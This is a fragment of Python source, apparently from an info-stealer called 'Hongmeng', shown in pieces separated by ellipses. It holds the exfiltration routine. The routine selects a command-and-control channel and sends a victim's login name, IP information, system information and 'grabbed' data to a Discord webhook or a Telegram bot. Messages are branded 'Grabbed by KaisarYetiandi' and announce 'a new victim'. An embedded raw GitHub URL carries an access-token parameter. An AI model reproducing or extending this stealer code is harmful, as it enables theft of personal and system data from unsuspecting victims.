...
Logger = logging.getLogger("Hongmeng")
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://raw.githubusercontent.com/KaisarYetiandi/Hongmeng/refs/heads/main/.github/workflows/image.png?token=GHSAT0AAAAAADGVV46RQP3MBMI5TZNAHHZI2EWOAYA"
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://github.com/KaisarYetiandi",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by KaisarYetiandi| https://github.com/KaisarYetiandi"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Hongmeng</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
